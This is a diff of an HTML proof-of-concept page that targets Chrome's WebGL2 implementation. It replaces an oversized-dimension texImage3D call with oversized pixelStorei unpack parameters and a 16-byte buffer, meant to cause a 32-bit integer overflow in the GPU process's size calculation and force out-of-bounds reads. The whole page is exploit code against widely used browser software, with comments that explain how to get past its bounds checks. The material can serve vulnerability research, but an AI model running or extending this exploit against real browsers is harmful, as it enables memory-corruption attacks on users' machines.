@@ -2,38 +2,43 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>POC</title>
+  <title>POC - PixelStorei Overflow</title>
 </head>
 <body>
-
-  <h1>POC test</h1>
-
+  <h1>POC test 2 - Unpack State Overflow</h1>
   <script>
     const canvas = document.createElement('canvas');
     const gl = canvas.getContext('webgl2');
     
-    // Dimensions to overflow 32-bit multiplication
-    // 65536 * 65536 = 0x100000000 -> truncates to 0 in 32-bit
-    const width = 65536; 
-    const height = 65536;
-    const depth = 1;
+    // Legal dimensions to pass Blink's MAX_3D_TEXTURE_SIZE check
+    const width = 1024; 
+    const height = 1024;
+    const depth = 2;
     
-    // Trigger the vulnerable HandleTexImage3D parser
-    // This should crash the Chrome GPU process instantly
-    gl.texImage3D(
-        gl.TEXTURE_3D, 
-        0, 
-        gl.RGBA8, 
-        width, 
-        height, 
-        depth, 
-        0, 
-        gl.RGBA, 
-        gl.UNSIGNED_BYTE, 
-        new Uint8Array(16) // Tiny buffer, but driver thinks it needs gigabytes!
-    );
+    // Manipulate the Unpack state. 
+    // The GPU calculates: total_size = (UNPACK_IMAGE_HEIGHT * UNPACK_ROW_LENGTH * bytes_per_pixel) + ...
+    // We use massive numbers to cause a 32-bit integer overflow in the size calculation *after* dimension checks.
+    gl.pixelStorei(gl.UNPACK_ROW_LENGTH,   0x10000000); // 268 million pixels per row
+    gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 0x10000000); 
+    gl.pixelStorei(gl.UNPACK_SKIP_PIXELS,  0x08000000);
+    gl.pixelStorei(gl.UNPACK_SKIP_ROWS,    0x08000000);
 
+    // Create a tiny buffer
+    const tinyBuffer = new Uint8Array(16);
+
+    try {
+        // Send it to the GPU. 
+        // If the size calculation overflows back to a small number (e.g., 16), it will pass bounds checks.
+        // But the driver will attempt to read UNPACK_ROW_LENGTH bytes!
+        gl.texImage3D(
+            gl.TEXTURE_3D, 0, gl.RGBA8, 
+            width, height, depth, 0, 
+            gl.RGBA, gl.UNSIGNED_BYTE, tinyBuffer
+        );
+        console.log("No crash. Check adb logcat to see if the GPU process logged an error.");
+    } catch (e) {
+        console.error("Renderer caught it:", e);
+    }
   </script>
-
 </body>
 </html>
